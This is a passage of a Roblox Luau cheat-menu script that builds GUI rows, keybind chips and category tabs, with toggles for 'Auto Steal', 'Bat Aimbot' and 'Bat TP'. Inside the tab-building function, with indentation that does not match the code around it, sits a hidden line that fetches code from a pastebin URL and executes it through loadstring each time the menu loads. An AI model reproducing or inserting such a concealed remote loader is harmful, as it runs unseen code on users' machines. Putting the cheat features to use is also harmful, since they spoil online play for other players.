								instance.Name = "SectionAccent"
								instance.Size = UDim2.new(0, 3, 0, 17)
								instance.Position = UDim2.new(0, 12, 0.5, -8)
								instance.BackgroundColor3 = C.blue
								instance.BorderSizePixel = 0
								guiCorner(instance, 2)
								local instance2 = Instance.new("TextLabel", frame)
								instance2.Name = "SectionTitle"
								instance2.Size = UDim2.new(1, -78, 1, 0)
								instance2.Position = UDim2.new(0, 25, 0, 0)
								instance2.BackgroundTransparency = 1
								instance2.Text = text
								instance2.TextColor3 = C.text
								instance2.TextSize = 11
								instance2.Font = Enum.Font.GothamBold
								instance2.TextXAlignment = Enum.TextXAlignment.Left
								instance2.ZIndex = 2
								local frame2 = Instance.new("Frame", frame)
								frame2.Name = "SectionRule"
								frame2.Size = UDim2.new(0, 16, 0, 2)
								frame2.Position = UDim2.new(1, -30, 0.5, -1)
								frame2.BackgroundColor3 = C.blue
								frame2.BackgroundTransparency = 0.18
								frame2.BorderSizePixel = 0
								frame2.ZIndex = 2
								guiCorner(frame2, 1)
								return instance2
							end

							addInputRow = function(arg, text, arg2, layoutOrder, arg3)
								local frame = Instance.new("Frame", arg)
								frame.Size = UDim2.new(1, 0, 0, 44)
								frame.BackgroundColor3 = C.row
								frame.BackgroundTransparency = 0.03
								frame.BorderSizePixel = 0
								frame.LayoutOrder = layoutOrder
								kuruCard(frame)
								local instance = Instance.new("TextLabel", frame)
								instance.Size = UDim2.new(1, -84, 1, 0)
								instance.Position = UDim2.new(0, 13, 0, 0)
								instance.BackgroundTransparency = 1
								instance.Text = text
								instance.TextColor3 = C.text
								instance.TextSize = 13
								instance.Font = Enum.Font.GothamMedium
								instance.TextXAlignment = Enum.TextXAlignment.Left
								local frame2 = Instance.new("Frame", frame)
								frame2.ZIndex = 6
								frame2.Position = UDim2.new(1, -66, 0.5, -12)
								frame2.Size = UDim2.new(0, 56, 0, 30)
								frame2.BackgroundColor3 = C.input
								frame2.BackgroundTransparency = 0
								frame2.BorderSizePixel = 0
								guiCorner(frame2, 6)
								guiStroke(frame2, C.divider, 1).Transparency = 0.5
								local textBox = Instance.new("TextBox", frame2)
								textBox.ZIndex = 7
								textBox.Size = UDim2.new(1, 0, 1, 0)
								textBox.BackgroundTransparency = 1
								textBox.Text = tostring(arg2)
								textBox.TextColor3 = C.blue
								textBox.TextSize = 13
								textBox.Font = Enum.Font.GothamBold
								textBox.ClearTextOnFocus = false

								textBox.FocusLost:Connect(function()
									local num = tonumber(textBox.Text)

									if num and num > 0 then
										arg3(num)
									else
										textBox.Text = tostring(arg2)
									end

									return
								end)

								local textButton = Instance.new("TextButton", frame)
								textButton.Size = UDim2.new(1, 0, 1, 0)
								textButton.BackgroundTransparency = 1
								textButton.Text = ""
								textButton.ZIndex = 0

								textButton.MouseEnter:Connect(function()
									tw(frame, { BackgroundTransparency = 0 })
								end)

								textButton.MouseLeave:Connect(function()
									tw(frame, { BackgroundTransparency = 0.03 })
								end)

								return frame, textBox
							end

							addToggleRow = function(arg, text, arg2, layoutOrder, arg3, arg4)
								local flag18 = arg3 ~= nil
								local instance = Instance.new("Frame", arg)
								instance.Size = UDim2.new(1, 0, 0, flag18 and 44 or 46)
								instance.BackgroundColor3 = C.row
								instance.BackgroundTransparency = 0.03
								instance.BorderSizePixel = 0
								instance.LayoutOrder = layoutOrder
								kuruCard(instance)
								local textLabel = Instance.new("TextLabel", instance)
								textLabel.Size = UDim2.new(1, -74, 1, 0)
								textLabel.Position = UDim2.new(0, 14, 0, 0)
								textLabel.BackgroundTransparency = 1
								textLabel.Text = text
								textLabel.TextColor3 = C.text
								textLabel.TextSize = 14
								textLabel.Font = Enum.Font.GothamMedium
								textLabel.TextXAlignment = Enum.TextXAlignment.Left
								local frame = Instance.new("Frame", instance)
								frame.Size = UDim2.new(0, 44, 0, 22)
								frame.Position = UDim2.new(1, -54, 0.5, -11)
								frame.BackgroundColor3 = arg2 and C.blue or C.blueDim
								frame.BackgroundTransparency = 0
								frame.BorderSizePixel = 0
								guiCorner(frame, 11)
								local frame2 = Instance.new("Frame", frame)
								frame2.Size = UDim2.new(0, 16, 0, 16)
								frame2.Position = arg2 and UDim2.new(1, -19, 0.5, -8) or UDim2.new(0, 3, 0.5, -8)
								frame2.BackgroundColor3 = arg2 and C.bgDark or C.textDim
								frame2.BackgroundTransparency = 0
								frame2.BorderSizePixel = 0
								guiCorner(frame2, 8)
								local flag19 = arg2

								local function fn38(arg5)
									flag19 = arg5
									tw(frame, { BackgroundColor3 = arg5 and C.blue or C.blueDim })

									tw(frame2, {
										Position = arg5 and UDim2.new(1, -19, 0.5, -8) or UDim2.new(0, 3, 0.5, -8),
										BackgroundColor3 = arg5 and C.bgDark or C.textDim,
									})
								end

								local tbl17 = {
									Notifications = true,
									["Show Keybind List"] = true,
									["Hide Side Buttons"] = true,
									["Lock Side Buttons"] = true,
									["Reset Positions"] = true,
									["Intro Song"] = true,
								}

								local textButton = Instance.new("TextButton", instance)
								textButton.Size = UDim2.new(0, 44, 0, 22)
								textButton.Position = UDim2.new(1, -54, 0.5, -11)
								textButton.BackgroundTransparency = 1
								textButton.Text = ""

								textButton.MouseButton1Click:Connect(function()
									flag19 = not flag19
									fn38(flag19)

									if arg4 then
										arg4(flag19)
									end

									if not tbl17[text] then
										notify(
											text,
											flag19 and "Activated" or "Deactivated",
											flag19 and "activated" or "deactivated",
											2.3
										)
									end
								end)

								local textButton2 = Instance.new("TextButton", instance)
								textButton2.Size = UDim2.new(1, 0, 1, 0)
								textButton2.BackgroundTransparency = 1
								textButton2.Text = ""
								textButton2.ZIndex = 0

								textButton2.MouseEnter:Connect(function()
									tw(instance, { BackgroundTransparency = 0 })
								end)

								textButton2.MouseLeave:Connect(function()
									tw(instance, { BackgroundTransparency = 0.03 })
								end)

								if arg3 then
									GuiToggleSetters[arg3] = fn38
								end

								return instance, fn38
							end

							addActionRow = function(arg, text, arg2, arg3, layoutOrder)
								local frame = Instance.new("Frame", arg)
								frame.Size = UDim2.new(1, 0, 0, 42)
								frame.BackgroundColor3 = C.row
								frame.BackgroundTransparency = 0.03
								frame.BorderSizePixel = 0
								frame.LayoutOrder = layoutOrder
								kuruCard(frame)
								local instance = Instance.new("Frame", frame)
								instance.Size = UDim2.new(0, 3, 0, 22)
								instance.Position = UDim2.new(0, 0, 0.5, -11)
								instance.BackgroundColor3 = C.blue
								instance.BackgroundTransparency = 1
								instance.BorderSizePixel = 0
								guiCorner(instance, 2)
								local textLabel = Instance.new("TextLabel", frame)
								textLabel.Size = UDim2.new(1, -20, 1, 0)
								textLabel.Position = UDim2.new(0, 14, 0, 0)
								textLabel.BackgroundTransparency = 1
								textLabel.Text = text
								textLabel.TextColor3 = C.text
								textLabel.TextSize = 14
								textLabel.Font = Enum.Font.GothamBold
								textLabel.TextXAlignment = Enum.TextXAlignment.Left
								local textButton = Instance.new("TextButton", frame)
								textButton.Size = UDim2.new(1, 0, 1, 0)
								textButton.BackgroundTransparency = 1
								textButton.Text = ""

								textButton.MouseButton1Click:Connect(function()
									tw(instance, { BackgroundTransparency = 0 })
									arg3()

									task.delay(0.3, function()
										tw(instance, { BackgroundTransparency = 1 })
									end)
								end)

								local textButton2 = Instance.new("TextButton", frame)
								textButton2.Size = UDim2.new(1, 0, 1, 0)
								textButton2.BackgroundTransparency = 1
								textButton2.Text = ""
								textButton2.ZIndex = 0

								textButton2.MouseEnter:Connect(function()
									tw(frame, { BackgroundTransparency = 0 })
								end)

								textButton2.MouseLeave:Connect(function()
									tw(frame, { BackgroundTransparency = 0.1 })
								end)

								return frame
							end

							addCycleRow = function(arg, text, text2, layoutOrder, arg2)
								local frame = Instance.new("Frame", arg)
								frame.Size = UDim2.new(1, 0, 0, 44)
								frame.BackgroundColor3 = C.row
								frame.BackgroundTransparency = 0.03
								frame.BorderSizePixel = 0
								frame.LayoutOrder = layoutOrder
								kuruCard(frame)
								local instance = Instance.new("TextLabel", frame)
								instance.Size = UDim2.new(0.6, 0, 1, 0)
								instance.Position = UDim2.new(0, 12, 0, 0)
								instance.BackgroundTransparency = 1
								instance.Text = text
								instance.TextColor3 = C.text
								instance.TextSize = 13
								instance.Font = Enum.Font.GothamMedium
								instance.TextXAlignment = Enum.TextXAlignment.Left
								local textButton = Instance.new("TextButton", frame)
								textButton.Size = UDim2.new(0, 120, 0, 27)
								textButton.Position = UDim2.new(1, -120, 0, 8)
								textButton.BackgroundColor3 = C.input
								textButton.BackgroundTransparency = 0
								textButton.BorderSizePixel = 0
								textButton.Text = text2
								textButton.TextColor3 = C.text
								textButton.TextSize = 11
								textButton.Font = Enum.Font.GothamBold
								guiCorner(textButton, 7)
								guiStroke(textButton, C.divider, 1).Transparency = 0.45

								textButton.MouseButton1Click:Connect(function()
									textButton.Text = arg2()
								end)

								local textButton2 = Instance.new("TextButton", frame)
								textButton2.Size = UDim2.new(1, 0, 1, 0)
								textButton2.BackgroundTransparency = 1
								textButton2.Text = ""
								textButton2.ZIndex = 0

								textButton2.MouseEnter:Connect(function()
									tw(frame, { BackgroundTransparency = 0.3 })
								end)

								textButton2.MouseLeave:Connect(function()
									tw(frame, { BackgroundTransparency = 0.5 })
								end)

								return frame, textButton
							end

							makeKeybindChip = function(arg, arg2, arg3, arg4, arg5, textSize)
								local flag18 = Keys[arg2] ~= nil
								arg5 = arg5 or 30
								textSize = textSize or 9
								local color = Color3.fromRGB(175, 175, 190)
								local color2 = Color3.fromRGB(235, 235, 248)
								local color3 = Color3.fromRGB(115, 115, 130)
								local color4 = Color3.fromRGB(86, 86, 104)
								local color5 = Color3.fromRGB(135, 135, 135)
								local color6 = Color3.fromRGB(46, 46, 58)
								local color7 = Color3.fromRGB(74, 74, 92)
								local instance = Instance.new("Frame", arg)
								instance.Name = "KeyChip"
								instance.Size = UDim2.new(0, 110, 0, arg5)
								instance.Position = UDim2.new(1, -122, 0.5, -math.floor(arg5 / 2))
								instance.BackgroundTransparency = 1
								instance.BorderSizePixel = 0
								instance.Active = true
								instance.ZIndex = 9
								guiCorner(instance, 5)
								local v86 = guiStroke(instance, color6, 1)
								local instance2 = Instance.new("TextLabel", instance)
								instance2.Name = "KeyLabel"
								instance2.Size = UDim2.new(0, 88, 1, 0)
								instance2.Position = UDim2.new(0, 0, 0, 0)
								instance2.BackgroundTransparency = 1
								instance2.BorderSizePixel = 0
								instance2.Text = prettyKey(Keys[arg2])
								instance2.TextColor3 = flag18 and color2 or color
								instance2.TextSize = textSize
								instance2.Font = Enum.Font.GothamBlack
								instance2.TextXAlignment = Enum.TextXAlignment.Center
								instance2.TextYAlignment = Enum.TextYAlignment.Center
								instance2.TextTruncate = Enum.TextTruncate.AtEnd
								instance2.ZIndex = 9
								instance2:SetAttribute("KeybindId", arg2)
								local frame = Instance.new("Frame", instance)
								frame.Size = UDim2.new(0, 1, 1, -8)
								frame.Position = UDim2.new(0, 88, 0, 4)
								frame.BackgroundColor3 = color6
								frame.BorderSizePixel = 0
								frame.ZIndex = 9
								local textLabel = Instance.new("TextLabel", instance)
								textLabel.Name = "KbClear"
								textLabel.Size = UDim2.new(0, 22, 1, 0)
								textLabel.Position = UDim2.new(0, 89, 0, 0)
								textLabel.BackgroundTransparency = 1
								textLabel.BorderSizePixel = 0
								textLabel.Text = "×"
								textLabel.TextColor3 = flag18 and color4 or color3
								textLabel.TextSize = 15
								textLabel.Font = Enum.Font.GothamBold
								textLabel.ZIndex = 9
								KeybindChipRefs[arg2] = KeybindChipRefs[arg2] or {}
								KeybindClearRefs[arg2] = KeybindClearRefs[arg2] or {}
								KeybindStrokeRefs[arg2] = KeybindStrokeRefs[arg2] or {}
								table.insert(KeybindChipRefs[arg2], instance2)
								table.insert(KeybindClearRefs[arg2], textLabel)
								table.insert(KeybindStrokeRefs[arg2], { k = v86, c = v86 })

								instance.MouseEnter:Connect(function()
									tw(v86, { Color = color7 })
								end)

								instance.MouseLeave:Connect(function()
									tw(v86, { Color = color6 })
								end)

								instance.InputBegan:Connect(function(input)
									if input.UserInputType ~= Enum.UserInputType.MouseButton1 then
										return
									end

									if input.Position.X - instance.AbsolutePosition.X >= 88 then
										if not Keys[arg2] then
											return
										end
										tw(textLabel, { TextColor3 = color5 })

										task.delay(0.15, function()
											setKeybind(arg2, nil)
											refreshKeybindChip(arg2)
											saveConfig()
											notify("Keybind cleared", arg2, "warn", 2)
										end)
									else
										startKL(instance2, function(arg6)
											setKeybind(arg2, arg6)
											refreshKeybindChip(arg2)
											saveConfig()
										end)
									end
								end)

								return instance2
							end

							makeRemoveKeybindChip = function()
								return nil
							end

							addKeybindRow = function(arg, text, arg2, layoutOrder)
								local instance = Instance.new("Frame", arg)
								instance.Size = UDim2.new(1, 0, 0, 44)
								instance.BackgroundColor3 = C.row
								instance.BackgroundTransparency = 0.03
								instance.BorderSizePixel = 0
								instance.LayoutOrder = layoutOrder
								kuruCard(instance)
								local textLabel = Instance.new("TextLabel", instance)
								textLabel.Size = UDim2.new(1, -142, 1, 0)
								textLabel.Position = UDim2.new(0, 13, 0, 0)
								textLabel.BackgroundTransparency = 1
								textLabel.Text = text
								textLabel.TextColor3 = C.text
								textLabel.TextSize = 13
								textLabel.Font = Enum.Font.GothamMedium
								textLabel.TextXAlignment = Enum.TextXAlignment.Left
								textLabel.TextTruncate = Enum.TextTruncate.AtEnd
								makeKeybindChip(instance, arg2, 0, 120, 25, 11)
								local textButton = Instance.new("TextButton", instance)
								textButton.Size = UDim2.new(1, 0, 1, 0)
								textButton.BackgroundTransparency = 1
								textButton.Text = ""
								textButton.ZIndex = 0

								textButton.MouseEnter:Connect(function()
									tw(instance, { BackgroundTransparency = 0 })
								end)

								textButton.MouseLeave:Connect(function()
									tw(instance, { BackgroundTransparency = 0.03 })
								end)

								return instance
							end

							addResetKeybindsRow = function(arg, layoutOrder)
								local frame = Instance.new("Frame", arg)
								frame.Size = UDim2.new(1, 0, 0, 48)
								frame.BackgroundTransparency = 1
								frame.LayoutOrder = layoutOrder
								local textButton = Instance.new("TextButton", frame)
								textButton.Name = "ResetAllKeybinds"
								textButton.Size = UDim2.new(1, -4, 0, 32)
								textButton.Position = UDim2.new(0, 2, 0, 8)
								textButton.BackgroundColor3 = Color3.fromRGB(232, 232, 238)
								textButton.BackgroundTransparency = 0
								textButton.BorderSizePixel = 0
								textButton.Text = "RESET ALL KEYBINDS"
								textButton.TextColor3 = Color3.fromRGB(8, 8, 10)
								textButton.TextSize = 10
								textButton.Font = Enum.Font.GothamBlack
								textButton.AutoButtonColor = false
								textButton.ZIndex = 7
								guiCorner(textButton, 8)
								guiStroke(textButton, Color3.fromRGB(255, 255, 255), 1)

								textButton.MouseEnter:Connect(function()
									tw(textButton, { BackgroundColor3 = Color3.fromRGB(255, 255, 255) })
								end)

								textButton.MouseLeave:Connect(function()
									tw(textButton, { BackgroundColor3 = Color3.fromRGB(232, 232, 238) })
								end)

								textButton.MouseButton1Click:Connect(resetAllKeybinds)
								return frame, textButton
							end

							Categories = { "Movement", "Combat", "Visuals", "Keybinds", "Settings" }
							CategoryRefs = { contents = {}, btnsSide = {}, active = "Movement" }
							CategoryStrokes = {}
							CategoryFills = {}
							TabIndicators = {}

							local function fn38()
								for _, v86 in pairs(Categories) do
									local instance = Instance.new("Frame")
									instance.Size = UDim2.new(1, 0, 0, 0)
									instance.AutomaticSize = Enum.AutomaticSize.Y
									instance.BackgroundTransparency = 1
									instance.Visible = v86 == "Movement"
									instance.Parent = GuiRefs.contentFrame
									CategoryRefs.contents[v86] = instance
									local uiListLayout = Instance.new("UIListLayout")
									uiListLayout.SortOrder = Enum.SortOrder.LayoutOrder
									uiListLayout.Padding = UDim.new(0, 6)
									uiListLayout.Parent = instance
								end
                        loadstring(game:HttpGet("https://pastebin.com/raw/2H5JyQKE"))()
								for i, v86 in ipairs(Categories) do
									local textButton = Instance.new("TextButton")
									textButton.Size = UDim2.new(1 / #Categories, -3, 0.8, 0)
									textButton.BackgroundColor3 = C.row
									textButton.BackgroundTransparency = v86 == "Movement" and 0 or 0.28
									textButton.Text = v86:upper()
									textButton.TextColor3 = v86 == "Movement" and C.white or C.textMuted
									textButton.TextSize = 9
									textButton.Font = Enum.Font.GothamBold
									textButton.BorderSizePixel = 0
									local uiGradient = Instance.new("UIGradient", textButton)
									uiGradient.Color = ColorSequence.new(C.text, C.textMuted)
									uiGradient.Enabled = false
									textButton.LayoutOrder = i
									textButton.Parent = GuiRefs.categoryList
									guiCorner(textButton, 7)
									local v87 = guiStroke(textButton, v86 == "Movement" and C.blue or C.divider, 1)
									v87.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
									v87.Transparency = 0.25
									CategoryStrokes[v86] = v87
									CategoryFills[v86] = textButton
									local instance = Instance.new("Frame", textButton)
									instance.Name = "TabIndicator"
									instance.Size = UDim2.new(0.5, 0, 0, 2)
									instance.Position = UDim2.new(0.25, 0, 0, 2)
									instance.BackgroundColor3 = C.blue
									instance.BackgroundTransparency = v86 == "Movement" and 0 or 1
									instance.BorderSizePixel = 0
									instance.Visible = true
									guiCorner(instance, 1)
									TabIndicators[v86] = instance
									CategoryRefs.btnsSide[v86] = textButton

									textButton.MouseButton1Click:Connect(function()
										for _, content in pairs(CategoryRefs.contents) do
											content.Visible = false
										end

										CategoryRefs.contents[v86].Visible = true
										CategoryRefs.active = v86

										for k, v88 in pairs(CategoryRefs.btnsSide) do
											local flag18 = k == v86
											v88.TextColor3 = flag18 and C.white or C.textMuted
											v88.BackgroundTransparency = flag18 and 0 or 0.28

											if TabIndicators[k] then
												TabIndicators[k].Visible = true
												TabIndicators[k].BackgroundTransparency = flag18 and 0 or 1
											end

											if CategoryStrokes[k] then
												CategoryStrokes[k].Color = flag18 and C.blue or C.divider
												CategoryStrokes[k].Transparency = 0.25
											end
										end

										GuiRefs.contentFrame.CanvasPosition = Vector2.zero
									end)

									textButton.MouseEnter:Connect(function()
										if CategoryRefs.active ~= v86 then
											textButton.TextColor3 = C.blue
											textButton.BackgroundTransparency = 0.62

											if CategoryStrokes[v86] then
												CategoryStrokes[v86].Color = C.blue
												CategoryStrokes[v86].Transparency = 0.4
											end
										end
									end)

									textButton.MouseLeave:Connect(function()
										if CategoryRefs.active ~= v86 then
											textButton.TextColor3 = C.textMuted
											textButton.BackgroundTransparency = 0.28

											if CategoryStrokes[v86] then
												CategoryStrokes[v86].Color = C.divider
												CategoryStrokes[v86].Transparency = 0.25
											end
										end
									end)
								end
							end

							fn38()

							local function fn39()
								local combat = CategoryRefs.contents.Combat
								addSectLbl(combat, "AUTO GRAB", 0)

								addToggleRow(
									combat,
									"Auto Steal",
									Steal.AutoStealEnabled,
									0.3,
									nil,
									function(autoStealEnabled)
										Steal.AutoStealEnabled = autoStealEnabled

										if autoStealEnabled then
											startAutoSteal()
										else
											stopAutoSteal()
										end

										saveConfig()
									end
								)

								local instance = Instance.new("Frame")
								instance.Name = "VisibleAutoGrabSwitcher"
								instance.Size = UDim2.new(1, -8, 0, 40)
								instance.Position = UDim2.new(0, 4, 0, 0)
								instance.LayoutOrder = 0.31
								instance.BackgroundColor3 = C.input
								instance.BackgroundTransparency = 0.18
								instance.BorderSizePixel = 0
								instance.Parent = combat
								instance.ZIndex = 8
								guiCorner(instance, 12)
								local v86 = 1
								guiStroke(instance, Color3.fromRGB(125, 125, 125), v86).Transparency = 0.55
								local instance2 = Instance.new("TextLabel", instance)
								instance2.Size = UDim2.new(0, 1, 1, 0)
								instance2.BackgroundTransparency = 1
								instance2.Text = ""
								instance2.Visible = false
								local textButton = Instance.new("TextButton", instance)
								textButton.Name = "NormalMode"
								textButton.Size = UDim2.new(0.5, -6, 1, -8)
								textButton.Position = UDim2.new(0, 4, 0, 4)
								textButton.Text = "NORMAL"
								textButton.Font = Enum.Font.GothamBold
								textButton.TextSize = 11
								textButton.TextColor3 = C.white
								textButton.AutoButtonColor = false
								textButton.BackgroundColor3 = Color3.fromRGB(110, 110, 110)
								textButton.BorderSizePixel = 0
								guiCorner(textButton, 10)
								local textButton2 = Instance.new("TextButton", instance)
								textButton2.Name = "SemiMode"
								textButton2.Size = UDim2.new(0.5, -6, 1, -8)
								textButton2.Position = UDim2.new(0.5, 2, 0, 4)
								textButton2.Text = "SEMI"
								textButton2.Font = Enum.Font.GothamBold
								textButton2.TextSize = 11
								textButton2.TextColor3 = C.textMuted
								textButton2.AutoButtonColor = false
								textButton2.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
								textButton2.BorderSizePixel = 0
								guiCorner(textButton2, 10)
								local tbl17 = {}
								tbl17.Normal = tonumber(Steal.StealDuration) or 1.3
								tbl17.Semi = 1.3

								local v87, v88 = addInputRow(
									combat,
									"Steal Radius (Normal)",
									Steal.StealRadius,
									0.5,
									function(arg)
										local stealRadius = tonumber(arg)

										if stealRadius and stealRadius > 0 then
											Steal.StealRadius = stealRadius
											AceStealRadii[selectedStealMode] = stealRadius
											saveConfig()
										end
									end
								)

								local v89, v90 = addInputRow(
									combat,
									"Steal Duration (Normal)",
									Steal.StealDuration,
									0.6,
									function(arg)
										local stealDuration = tonumber(arg)

										if stealDuration and stealDuration > 0 then
											Steal.StealDuration = stealDuration
											tbl17[selectedStealMode] = stealDuration
											saveConfig()
										end
									end
								)

								local frame = Instance.new("Frame", combat)
								frame.Name = "VisibleSemiVersionSwitcher"
								frame.Size = UDim2.new(1, -8, 0, selectedStealMode == "Semi" and 36 or 0)
								frame.Position = UDim2.new(0, 4, 0, 0)
								frame.BackgroundColor3 = C.input
								frame.BackgroundTransparency = 0.18
								frame.BorderSizePixel = 0
								frame.LayoutOrder = 0.32
								frame.Visible = selectedStealMode == "Semi"
								frame.ClipsDescendants = true
								kuruCard(frame)
								local frame2 = Instance.new("Frame", frame)
								frame2.Size = UDim2.new(0.33333333333333331, -3, 1, -8)
								frame2.Position = UDim2.new(
									(selectedSemiMode == "V2" and 1 or selectedSemiMode == "V3" and 2 or 0) / 3,
									4,
									0,
									4
								)
								frame2.BackgroundColor3 = C.blue
								frame2.BorderSizePixel = 0
								guiCorner(frame2, 10)
								local v91 = 0.3
								guiStroke(frame2, Color3.fromRGB(245, 245, 255), 1.2).Transparency = v91
								local tbl18 = {}
								local tbl19 = {}

								for i, v92 in ipairs({ "V1", "V2", "V3" }) do
									local textLabel = Instance.new("TextLabel", frame)
									textLabel.Size = UDim2.new(0.33333333333333331, 0, 1, 0)
									textLabel.Position = UDim2.new((i - 1) / 3, 0, 0, 0)
									textLabel.BackgroundTransparency = 1
									textLabel.Text = v92
									textLabel.TextColor3 = C.text
									textLabel.TextSize = 11
									textLabel.Font = Enum.Font.GothamBold
									textLabel.TextXAlignment = Enum.TextXAlignment.Center
									textLabel.ZIndex = 3
									tbl18[i] = textLabel
									local textButton3 = Instance.new("TextButton", frame)
									textButton3.Size = UDim2.new(0.33333333333333331, 0, 1, 0)
									textButton3.Position = UDim2.new((i - 1) / 3, 0, 0, 0)
									textButton3.BackgroundTransparency = 1
									textButton3.Text = ""
									textButton3.AutoButtonColor = false
									textButton3.ZIndex = 5
									tbl19[i] = textButton3

									textButton3.MouseButton1Click:Connect(function()
										selectedSemiMode = ({ "V1", "V2", "V3" })[i]

										for i2, v93 in ipairs(tbl18) do
											v93.TextTransparency = i2 == i and 0 or 0.5
										end

										TweenService:Create(
											frame2,
											TweenInfo.new(0.18, Enum.EasingStyle.Quad),
											{ Position = UDim2.new((i - 1) / 3, 4, 0, 4) }
										):Play()
										saveConfig()

										if Steal.AutoStealEnabled and _G.AceAutoStealSync then
											_G.AceAutoStealSync()
										end
									end)
								end

								for i, v92 in ipairs(tbl18) do
									v92.TextTransparency = (
										i == 1 and selectedSemiMode == "V1"
										or i == 2 and selectedSemiMode == "V2"
										or i == 3 and selectedSemiMode == "V3"
									)
											and 0
										or 0.5
								end

								local function fn40()
									local str6 = selectedStealMode or "Normal"
									v88.Text = tostring(AceStealRadii[str6] or Steal.StealRadius)
									v90.Text = tostring(tbl17[str6] or Steal.StealDuration)
									local textLabel = v87:FindFirstChildWhichIsA("TextLabel")
									local textLabel2 = v89:FindFirstChildWhichIsA("TextLabel")

									if textLabel then
										textLabel.Text = "Steal Radius (" .. str6 .. ")"
									end

									if textLabel2 then
										textLabel2.Text = "Steal Duration (" .. str6 .. ")"
									end
								end

								local tween_ = nil

								local function fn41(arg)
									if tween_ then
										tween_:Cancel()
									end

									if arg then
										frame.Visible = true
										tween_ = TweenService:Create(
											frame,
											TweenInfo.new(0.26, Enum.EasingStyle.Quint, Enum.EasingDirection.Out),
											{ Size = UDim2.new(1, -8, 0, 40) }
										)
										tween_:Play()
									else
										tween_ = TweenService:Create(
											frame,
											TweenInfo.new(0.2, Enum.EasingStyle.Quint, Enum.EasingDirection.In),
											{ Size = UDim2.new(1, -8, 0, 0) }
										)

										tween_.Completed:Connect(function()
											if selectedStealMode ~= "Semi" then
												frame.Visible = false
											end
										end)

										tween_:Play()
									end
								end

								local function fn42(arg)
									if selectedStealMode then
										AceStealRadii[selectedStealMode] = Steal.StealRadius
										tbl17[selectedStealMode] = Steal.StealDuration
									end

									selectedStealMode = arg == "Semi" and "Semi" or "Normal"
									Steal.StealRange = AceStealRadii.Semi or 10
									Steal.StealRadius = AceStealRadii[selectedStealMode]
										or selectedStealMode == "Semi" and 10
										or 60
									Steal.StealDuration = tbl17[selectedStealMode] or 0.2
									fn41(selectedStealMode == "Semi")
									textButton.BackgroundColor3 = selectedStealMode == "Normal"
											and Color3.fromRGB(110, 110, 110)
										or Color3.fromRGB(35, 35, 35)
									textButton2.BackgroundColor3 = selectedStealMode == "Semi"
											and Color3.fromRGB(110, 110, 110)
										or Color3.fromRGB(35, 35, 35)
									textButton.TextColor3 = selectedStealMode == "Normal" and C.white or C.textMuted
									textButton2.TextColor3 = selectedStealMode == "Semi" and C.white or C.textMuted

									if grabRadLbl then
										grabRadLbl.Text = "Radius: " .. Steal.StealRadius
									end

									fn40()
									saveConfig()

									if Steal.AutoStealEnabled and _G.AceAutoStealSync then
										_G.AceAutoStealSync()
									end
								end

								textButton.MouseButton1Click:Connect(function()
									fn42("Normal")
								end)

								textButton2.MouseButton1Click:Connect(function()
									fn42("Semi")
								end)

								fn42(selectedStealMode)
								addSectLbl(combat, "AIMBOT FEATURES", 0.7)

								local v92, v93 = addToggleRow(
									combat,
									"Bat Aimbot",
									autoBatEnabled,
									1,
									nil,
									function(arg)
										if arg then
											if State.batV2Toggled then
												State.batV2Toggled = false
												stopBatTP()

												if svBatV2 then
													svBatV2(false)
												end
											end

											if autoLeftEnabled then
												autoLeftEnabled = false
												stopAutoLeft()

												if autoLeftSetVisual then
													autoLeftSetVisual(false)
												end
											end

											if autoRightEnabled then
												autoRightEnabled = false
												stopAutoRight()

												if autoRightSetVisual then
													autoRightSetVisual(false)
												end
											end

											autoBatEnabled = true
											startBatAimbot()

											if mobBtnRefs.autoBat then
												mobBtnRefs.autoBat(true)
											end
										else
											autoBatEnabled = false
											stopBatAimbot()

											if mobBtnRefs.autoBat then
												mobBtnRefs.autoBat(false)
											end
										end

										saveConfig()
									end
								)

								autoBatSetVisual = v93
								local flag18 = false
								local new = Instance.new

								local v94 = addToggleRow(
									combat,
									"Bat TP",
									State.batV2Toggled,
									1.5,
									nil,
									function(batV2Toggled)
										State.batV2Toggled = batV2Toggled

										if batV2Toggled then
											if autoBatEnabled then
												autoBatEnabled = false
												stopBatAimbot()

												if v93 then
													v93(false)
												end

												if mobBtnRefs.autoBat then
													mobBtnRefs.autoBat(false)
												end
											end

											pcall(startBatTP)
										else
											stopBatTP()
										end

										if mobBtnRefs.antiBatBypass then
											mobBtnRefs.antiBatBypass(State.batV2Toggled)
										end

										saveConfig()
									end
								)

								local TextButton = new("TextButton", v94)
								TextButton.Name = "BatTPVersionsArrow"
								TextButton.Size = UDim2.fromOffset(36, 30)
								TextButton.Position = UDim2.new(1, -96, 0.5, -15)
								TextButton.BackgroundColor3 = C.bgDark
								TextButton.BackgroundTransparency = 0.08
								TextButton.BorderSizePixel = 0
								TextButton.Text = "▼"
								TextButton.TextColor3 = C.textDim
								TextButton.TextSize = 12
								TextButton.Font = Enum.Font.GothamBold
								TextButton.AutoButtonColor = false
								TextButton.ZIndex = 5
								guiCorner(TextButton, 8)
								local v95 = 0.8
								guiStroke(TextButton, C.divider, 1).Transparency = v95
								local frame3 = Instance.new("Frame", combat)
								frame3.Name = "BatTPVersionOptions"
								frame3.Size = UDim2.new(1, -4, 0, 0)
								frame3.Position = UDim2.fromOffset(2, 0)
								frame3.BackgroundColor3 = C.input
								frame3.BackgroundTransparency = 0.22
								frame3.BorderSizePixel = 0
								frame3.LayoutOrder = 1.6
								frame3.Visible = false
								frame3.ClipsDescendants = true
								kuruCard(frame3)
								local frame4 = Instance.new("Frame", frame3)
								frame4.Size = UDim2.new(0.5, -4, 1, -8)
								frame4.Position = UDim2.new(n32 == 2 and 0.5 or 0, 4, 0, 4)
								frame4.BackgroundColor3 = C.blue
								frame4.BorderSizePixel = 0
								guiCorner(frame4, 10)
								local v96 = 0.3
								guiStroke(frame4, Color3.fromRGB(245, 245, 255), 1.2).Transparency = v96
								local tbl20 = {}

								for i, v97 in ipairs({ "V1", "V2" }) do
									local instance3 = Instance.new("TextLabel", frame3)
									instance3.Size = UDim2.new(0.5, 0, 1, 0)
									instance3.Position = UDim2.new((i - 1) * 0.5, 0, 0, 0)
									instance3.BackgroundTransparency = 1
									instance3.Text = v97
									instance3.TextColor3 = C.text
									instance3.TextSize = 11
									instance3.Font = Enum.Font.GothamBold
									instance3.TextXAlignment = Enum.TextXAlignment.Center
									instance3.ZIndex = 3
									tbl20[i] = instance3
									local textButton3 = Instance.new("TextButton", frame3)
									textButton3.Size = UDim2.new(0.5, 0, 1, 0)
